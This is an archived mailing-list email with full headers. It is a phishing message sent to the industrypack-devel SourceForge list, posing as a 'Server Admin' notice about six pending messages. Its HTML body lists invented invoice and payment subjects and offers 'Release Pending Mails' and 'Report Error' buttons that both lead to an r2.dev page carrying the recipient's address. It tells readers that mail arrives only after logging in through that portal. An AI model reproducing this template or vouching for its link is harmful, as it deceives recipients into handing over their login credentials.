Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 67C89950BBD
	for <lists+industrypack-devel@lfdr.de>; Tue, 13 Aug 2024 19:53:05 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1sdvhg-0004pC-72
	for lists+industrypack-devel@lfdr.de;
	Tue, 13 Aug 2024 17:53:04 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <admin@gtscvnn.com>) id 1sdvhZ-0004oq-Gt
 for industrypack-devel@lists.sourceforge.net;
 Tue, 13 Aug 2024 17:52:57 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=O/s0uhX6xjWiwu6C8vqr1NeABrByxWD+LrPABpDbnWM=; b=S2RAIN8UQHwblD1M1YnaGvsRWO
 IzKtVjzCIVb7aSBxyydHuptsNpoYBUaVBl49NN6L8jl7evn48wOxGcIWE40WICSLGURzFngo4I0fl
 XDLjXBlhwF23Fgd/3g7oHDSQTMh7w2NUaBn/7dOWcvTYJlxzbZtyrCsFs4RlHNPOkffI=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=O/s0uhX6xjWiwu6C8vqr1NeABrByxWD+LrPABpDbnWM=; b=j
 rV79jdFVt77v5Wc1LtCq2512xcXsrnAp1azBNkwGlbHH15lBpoMIGXu6vj+26CM+dqwS1VslwHEoe
 vZquXVRs62KUsmyi3oJYKUNMtNaDdE18jr6h/Da8n7ASsLpFzFoEEK0kp92XEm4GcLRJ79V5FQLpX
 /PxmOKKcv2wOnaEM=;
Received: from server.gtscvnn.com ([37.221.67.180] helo=gtscvnn.com)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1sdvhX-000535-1q for industrypack-devel@lists.sourceforge.net;
 Tue, 13 Aug 2024 17:52:56 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=gtscvnn.com
 ; s=mail;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
 Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:
 Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:
 In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:
 List-Post:List-Owner:List-Archive;
 bh=O/s0uhX6xjWiwu6C8vqr1NeABrByxWD+LrPABpDbnWM=; b=rBSJMgiBVcx0aP8sFVrFXIjLjl
 cqr63CtosDWGCQQjun11ioPUe+VC4zn1ZOZhPxjARo1sRMYkSGpBZ5kPrtFGtEvI90za9qzdO13DR
 kdnXvknfy/wRsGzFr2kp7mf/XT94grSkPI+WfEKdIvmV+fr92GuqLdQd+8g1N254K4BQ=;
Received: from [46.183.220.47] (helo=ip-220-47.dataclub.info)
 by gtscvnn.com with esmtpsa (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
 (Exim 4.93) (envelope-from <admin@gtscvnn.com>) id 1sdjJS-0007Rm-6i
 for industrypack-devel@lists.sourceforge.net; Tue, 13 Aug 2024 07:39:16 +0300
From: Supportlists.sourceforge.net<admin@gtscvnn.com>
To: industrypack-devel@lists.sourceforge.net
Date: 13 Aug 2024 07:39:12 +0300
Message-ID: <20240813073912.D89BC82872BC2428@gtscvnn.com>
MIME-Version: 1.0
X-Helo-Check: bad, Forged Random Domain (gtscvnn.com)
X-Spam-Score: 0.5 (/)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  From industrypack-devel@lists.sourceforge.net Server Admin
 You have six messages still pending to be delivered to your inbox since
 Wednesday, 
 Aug 7th, 2024. Mailbox: industrypack-devel@lists.sourceforge.net 
 Content analysis details:   (0.5 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: r2.dev]
 0.5 FROM_DOMAIN_NOVOWEL    From: domain has series of non-vowel letters
 -0.0 SPF_PASS               SPF: sender matches SPF record
 -0.0 SPF_HELO_PASS          SPF: HELO matches SPF record
 0.1 URI_HEX                URI: URI hostname has long hexadecimal sequence
 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
 identical to background
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid -0.0 T_SCC_BODY_TEXT_LINE   No description available.
X-Headers-End: 1sdvhX-000535-1q
Subject: [Industrypack-devel] You have pending Mail!
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============2209614821002332727=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============2209614821002332727==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML>

<html><head><title></title>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body style=3D"margin: 0.4em;">
<table style=3D"border: 1px dotted rgb(211, 211, 211); border-image: none; =
text-align: left; color: rgb(51, 51, 51); text-transform: none; letter-spac=
ing: normal; font-family: Roboto, Tahoma, Helvetica, sans-serif; font-size:=
 13px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
: normal; border-collapse: collapse; box-sizing: border-box; orphans: 2; wi=
dows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: norm=
al; font-variant-caps: normal;=20
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
coration-style: initial; text-decoration-color: initial;">
<tbody style=3D"box-sizing: border-box;">
<tr style=3D"box-sizing: border-box;">
<th style=3D"padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: no=
ne; width: 2px; color: rgb(0, 0, 0); box-sizing: border-box; background-col=
or: rgb(2, 151, 64);">&nbsp;</th>
<td style=3D"padding: 5px; border: 0px solid rgb(0, 0, 0); border-image: no=
ne; width: 665px; color: rgb(0, 0, 0); font-family: Roboto, Tahoma, Helveti=
ca, sans-serif; box-sizing: border-box; background-color: rgb(243, 255, 248=
);"><span style=3D"font-size: 12px; box-sizing: border-box;">From industryp=
ack-devel@lists.sourceforge.net Server Admin<br style=3D"box-sizing: border=
-box;"></span></td>
</tr>
</tbody>
</table><p><br></p>
<div style=3D"width: 700px; text-align: left; color: rgb(0, 0, 0); text-tra=
nsform: none; text-indent: 0px; letter-spacing: normal; font-family: Roboto=
, Tahoma, Helvetica, sans-serif; font-size: 12px; font-style: normal; font-=
weight: 400; word-spacing: 0px; white-space: normal; box-sizing: border-box=
; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant=
-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0=
px; text-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial;"><br style=
=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;">You have=
 six messages still pending to be delivered to your inbox since Wednesday,&=
nbsp;Aug 7th, 2024.<br style=3D"box-sizing: border-box;"><br style=3D"box-s=
izing: border-box;"><strong>Mailbox:&nbsp;</strong>industrypack-devel@lists=
=2Esourceforge.net<br style=3D"box-sizing: border-box;"></div><p>
<br></p>
<div style=3D"text-align: left; color: rgb(34, 34, 34); text-transform: non=
e; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica,=
 sans-serif; font-size: 14px; font-style: normal; font-weight: 400; word-sp=
acing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; widows=
: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; =
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-decoration-style: initial;=20
text-decoration-color: initial;" dir=3D"ltr">
</div>
<div style=3D"text-align: left; color: rgb(34, 34, 34); text-transform: non=
e; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica,=
 sans-serif; font-size: 14px; font-style: normal; font-weight: 400; word-sp=
acing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; widows=
: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; =
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-decoration-style: initial;=20
text-decoration-color: initial;" dir=3D"ltr"><table style=3D"width: 700px; =
height: 208px; color: rgb(0, 0, 0); font-size: 15px; border-collapse: colla=
pse; box-sizing: border-box;" border=3D"0" cellspacing=3D"2" cellpadding=3D=
"2">
<tbody style=3D"box-sizing: border-box;">
<tr style=3D"box-sizing: border-box;">
<td style=3D"margin: 0px; width: 340px; font-family: Calibri; box-sizing: b=
order-box; background-color: rgb(243, 255, 248);"><strong style=3D"font-wei=
ght: bolder; box-sizing: border-box;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Subject</strong></t=
d>
<td style=3D"margin: 0px; width: 230px; font-family: Calibri; box-sizing: b=
order-box; background-color: rgb(243, 255, 248);"><strong style=3D"font-wei=
ght: bolder; box-sizing: border-box;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Recipient</stron=
g></td>
<td style=3D"margin: 0px; width: 150px; font-family: Calibri; box-sizing: b=
order-box; background-color: rgb(243, 255, 248);"><strong style=3D"font-wei=
ght: bolder; box-sizing: border-box;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Date</strong></td>
</tr>
<tr style=3D"box-sizing: border-box;">
<td style=3D"margin: 0px; width: 340px; font-family: Calibri; box-sizing: b=
order-box; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&#9888;&#6503=
9; FW: Invoice copy AWB No. 325-2322</td>
<td style=3D"margin: 0px; width: 230px; font-family: Calibri; box-sizing: b=
order-box; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;T=
o:<span>&nbsp;industrypack-devel@lists.sourceforge.net</span></td>
<td style=3D"margin: 0px; width: 150px; font-family: Calibri; box-sizing: b=
order-box; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;12/08/2024</td>
</tr>
<tr style=3D"box-sizing: border-box;">
<td style=3D"margin: 0px; width: 340px; font-family: Calibri; box-sizing: b=
order-box; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&#9888;&#6503=
9; Updated Sea Freight Quotation</td>
<td style=3D"margin: 0px; width: 230px; font-family: Calibri; box-sizing: b=
order-box; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;T=
o:<span>&nbsp;industrypack-devel@lists.sourceforge.net</span></td>
<td style=3D"margin: 0px; width: 150px; font-family: Calibri; box-sizing: b=
order-box; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;10/08/2024</td>
</tr>
<tr style=3D"box-sizing: border-box;">
<td style=3D"margin: 0px; width: 340px; font-family: Calibri; box-sizing: b=
order-box; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&#9888;&#6503=
9; AW: PO#203477 INVOICES</td>
<td style=3D"margin: 0px; width: 230px; font-family: Calibri; box-sizing: b=
order-box; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;T=
o:<span>&nbsp;industrypack-devel@lists.sourceforge.net</span></td>
<td style=3D"margin: 0px; width: 150px; font-family: Calibri; box-sizing: b=
order-box; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;07/08/2024</td>
</tr>
<tr style=3D"box-sizing: border-box;">
<td style=3D"margin: 0px; width: 340px; font-family: Calibri; box-sizing: b=
order-box; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&#9888;&#6503=
9; Re: &#20851;&#20110;&#21551;&#21160;&#21496;&#32534;&#21046;25/06/2024&#=
35745;&#21010;</td>
<td style=3D"margin: 0px; width: 230px; font-family: Calibri; box-sizing: b=
order-box; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;T=
o:<span>&nbsp;industrypack-devel@lists.sourceforge.net</span></td>
<td style=3D"margin: 0px; width: 150px; font-family: Calibri; box-sizing: b=
order-box; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;02/08/2024</td>
</tr>
<tr style=3D"box-sizing: border-box;">
<td style=3D"margin: 0px; width: 340px; font-family: Calibri; box-sizing: b=
order-box; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&#9888;&#6503=
9;&nbsp;Payment swift</td>
<td style=3D"margin: 0px; width: 230px; font-family: Calibri; box-sizing: b=
order-box; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;T=
o:<span>&nbsp;industrypack-devel@lists.sourceforge.net</span></td>
<td style=3D"margin: 0px; width: 150px; font-family: Calibri; box-sizing: b=
order-box; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;0=
1&nbsp;/06/2024</td>
</tr>
<tr style=3D"box-sizing: border-box;">
<td style=3D"margin: 0px; width: 340px; font-family: Calibri; box-sizing: b=
order-box; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&#9888;&#6503=
9; COVID-19 Safety Measures</td>
<td style=3D"margin: 0px; width: 230px; font-family: Calibri; box-sizing: b=
order-box; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;T=
o:<span>&nbsp;industrypack-devel@lists.sourceforge.net</span></td>
<td style=3D"margin: 0px; width: 160px; font-family: Calibri; box-sizing: b=
order-box; background-color: rgb(204, 204, 255);"><span style=3D"box-sizing=
: border-box;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;27/07/2024</span></td>
</tr>
</tbody>
</table></div>
<div style=3D"text-align: left; color: rgb(34, 34, 34); text-transform: non=
e; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica,=
 sans-serif; font-size: 14px; font-style: normal; font-weight: 400; word-sp=
acing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; widows=
: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; =
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-decoration-style: initial;=20
text-decoration-color: initial;" dir=3D"ltr">
</div>
<div style=3D"margin: 0px; text-align: left; color: rgb(34, 34, 34); text-t=
ransform: none; text-indent: 0px; letter-spacing: normal; font-family: Aria=
l, Helvetica, sans-serif; font-size: 14px; font-style: normal; font-weight:=
 400; word-spacing: 0px; white-space: normal; box-sizing: border-box; orpha=
ns: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatu=
res: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; tex=
t-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial;" dir=3D"ltr=
">&nbsp;</div>
<div style=3D"text-align: left; color: rgb(34, 34, 34); text-transform: non=
e; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica,=
 sans-serif; font-size: 14px; font-style: normal; font-weight: 400; word-sp=
acing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; widows=
: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; =
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-decoration-style: initial;=20
text-decoration-color: initial;" dir=3D"ltr">
</div>
<div style=3D"text-align: left; color: rgb(34, 34, 34); text-transform: non=
e; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica,=
 sans-serif; font-size: 14px; font-style: normal; font-weight: 400; word-sp=
acing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; widows=
: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; =
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-decoration-style: initial;=20
text-decoration-color: initial;" dir=3D"ltr"><ol style=3D"padding: 30px; ma=
rgin-top: 0px; box-sizing: border-box;">
<ol style=3D"padding: 30px; margin-top: 0px; box-sizing: border-box;">
<li style=3D"box-sizing: border-box;"><a style=3D"background: rgb(80, 110, =
216); padding: 10px; border-radius: 2px; color: rgb(255, 255, 255); text-de=
coration: none; box-sizing: border-box;" href=3D"https://pub-3a2f963fd3804d=
46b902109f59b7e533.r2.dev/redirecting.html#industrypack-devel@lists.sourcef=
orge.net" target=3D"_blank" rel=3D"noopener noreferrer">Release Pending Mai=
ls to inbox</a><br style=3D"box-sizing: border-box;"><br style=3D"box-sizin=
g: border-box;"><br style=3D"box-sizing: border-box;"></li>
<li style=3D"box-sizing: border-box;"><a style=3D"background: rgb(212, 0, 0=
); padding: 10px; border-radius: 2px; color: rgb(255, 255, 255); text-decor=
ation: none; box-sizing: border-box;" href=3D"https://pub-3a2f963fd3804d46b=
902109f59b7e533.r2.dev/redirecting.html#industrypack-devel@lists.sourceforg=
e.net" target=3D"_blank" rel=3D"noopener noreferrer">Report Error To Help D=
esk</a></li>
</ol>
<div style=3D"margin: 0px; font-family: arial, helvetica, sans-serif; box-s=
izing: border-box;"><br style=3D"box-sizing: border-box;"><br style=3D"box-=
sizing: border-box;">
<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white=
-space: normal; box-sizing: border-box; font-variant-ligatures: normal; fon=
t-variant-caps: normal; text-decoration-style: initial; text-decoration-col=
or: initial;" dir=3D"ltr"><span style=3D"color: rgb(0, 0, 0); font-family: =
Calibri; font-size: 14px; box-sizing: border-box;">
You will receive pending emails after successful login via portal as we apo=
logize for the inconvenience.</span></div><div style=3D"color: rgb(34, 34, =
34); text-transform: none; text-indent: 0px; letter-spacing: normal; font-f=
amily: Arial, Helvetica, sans-serif; font-size: small; font-style: normal; =
word-spacing: 0px; white-space: normal; box-sizing: border-box; font-varian=
t-ligatures: normal; font-variant-caps: normal; text-decoration-style: init=
ial; text-decoration-color: initial;" dir=3D"ltr">
<span style=3D"color: rgb(0, 0, 0); font-family: Calibri; font-size: 14px; =
box-sizing: border-box;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp; <span>
<span style=3D"color: rgb(51, 51, 51); text-transform: none; text-indent: 0=
px; letter-spacing: normal; font-family: Roboto , Arial; font-size: 12px; f=
ont-style: normal; word-spacing: 0px; float: none; display: inline; white-s=
pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);"=
><font color=3D"#4e40bf"><strong>mailserver report <br></strong><font color=
=3D"#4e40bf"><strong>
</strong><span style=3D"color: rgb(51, 51, 51); text-transform: none; text-=
indent: 0px; letter-spacing: normal; font-family: Roboto , Arial; font-size=
: 12px; font-style: normal; word-spacing: 0px; float: none; display: inline=
; white-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 25=
5, 255);"><strong>&copy;2024 </strong><a href=3D"http://mail.minhsongarment=
=2Evn/" target=3D"_blank" rel=3D"noreferrer"><font color=3D"#d64c29"><stron=
g>mail.</strong></font></a>lists.sourceforge.net<strong>
&nbsp;All Rights Reserved</strong></span></font></font></span></span></span=
></div><div style=3D"color: rgb(34, 34, 34); text-transform: none; text-ind=
ent: 0px; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif=
; font-size: small; font-style: normal; word-spacing: 0px; white-space: nor=
mal; box-sizing: border-box; font-variant-ligatures: normal; font-variant-c=
aps: normal; text-decoration-style: initial; text-decoration-color: initial=
;" dir=3D"ltr">
<span style=3D"color: rgb(0, 0, 0); font-family: Calibri; font-size: 14px; =
box-sizing: border-box;"><span><span style=3D"color: rgb(51, 51, 51); text-=
transform: none; text-indent: 0px; letter-spacing: normal; font-family: Rob=
oto , Arial; font-size: 12px; font-style: normal; word-spacing: 0px; float:=
 none; display: inline; white-space: normal; orphans: 2; widows: 2; backgro=
und-color: rgb(255, 255, 255);"><font color=3D"#4e40bf"><font color=3D"#4e4=
0bf">
<span style=3D"color: rgb(51, 51, 51); text-transform: none; text-indent: 0=
px; letter-spacing: normal; font-family: Roboto , Arial; font-size: 12px; f=
ont-style: normal; word-spacing: 0px; float: none; display: inline; white-s=
pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);"=
><br></span></font></font></span></span></span></div>
<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
size: small; font-style: normal; word-spacing: 0px; white-space: normal; bo=
x-sizing: border-box; font-variant-ligatures: normal; font-variant-caps: no=
rmal; text-decoration-style: initial; text-decoration-color: initial;" dir=
=3D"ltr"><span style=3D"color: rgb(0, 0, 0); font-family: Calibri; font-siz=
e: 14px; box-sizing: border-box;">
<span style=3D"color: rgb(51, 51, 51); text-transform: none; text-indent: 0=
px; letter-spacing: normal; font-family: Roboto , Arial; font-size: 12px; f=
ont-style: normal; word-spacing: 0px; float: none; display: inline; white-s=
pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);"=
><font color=3D"#4e40bf"><font color=3D"#4e40bf">
<span style=3D"color: rgb(51, 51, 51); text-transform: none; text-indent: 0=
px; letter-spacing: normal; font-family: Roboto , Arial; font-size: 12px; f=
ont-style: normal; word-spacing: 0px; float: none; display: inline; white-s=
pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);"=
><br></span></font></font></span></span></div>
<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
size: small; font-style: normal; word-spacing: 0px; white-space: normal; bo=
x-sizing: border-box; font-variant-ligatures: normal; font-variant-caps: no=
rmal; text-decoration-style: initial; text-decoration-color: initial;" dir=
=3D"ltr"><span style=3D"color: rgb(0, 0, 0); font-family: Calibri; font-siz=
e: 14px; box-sizing: border-box;">
<span style=3D"color: rgb(51, 51, 51); text-transform: none; text-indent: 0=
px; letter-spacing: normal; font-family: Roboto , Arial; font-size: 12px; f=
ont-style: normal; word-spacing: 0px; float: none; display: inline; white-s=
pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);"=
><font color=3D"#4e40bf"><font color=3D"#4e40bf">
<span style=3D"color: rgb(51, 51, 51); text-transform: none; text-indent: 0=
px; letter-spacing: normal; font-family: Roboto , Arial; font-size: 12px; f=
ont-style: normal; word-spacing: 0px; float: none; display: inline; white-s=
pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);"=
><span class=3D"privacy">Privacy Policy:<br>
          Your information is only for the sole purpose of viewing this doc=
ument and would not be sold or shared to any
          third party</span></span></font></font></span></span></div><stron=
g>
</strong></div><strong>
</strong><div style=3D"width: 700px; margin-top: 30px; box-sizing: border-b=
ox;"><strong><hr style=3D"border-width: 1px 0px 0px; height: 0px; overflow:=
 visible; border-top-color: currentColor; border-top-style: solid; box-sizi=
ng: content-box;"></strong></div></ol></div>

<div style=3D"width: 700px; margin-top: 30px; box-sizing: border-box;"><hr =
style=3D"border-width: 1px 0px 0px; height: 0px; overflow: visible; border-=
top-color: currentColor; border-top-style: solid; box-sizing: content-box;"=
></div><div style=3D"margin: 0px; font-family: arial, helvetica, sans-serif=
; box-sizing: border-box;">
<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white=
-space: normal; box-sizing: border-box; font-variant-ligatures: normal; fon=
t-variant-caps: normal; text-decoration-style: initial; text-decoration-col=
or: initial;" dir=3D"ltr"><span style=3D"color: rgb(0, 0, 0); font-family: =
Calibri; font-size: 14px; box-sizing: border-box;"><br>
</span></div>
</div>



</body></html>


--===============2209614821002332727==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============2209614821002332727==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============2209614821002332727==--
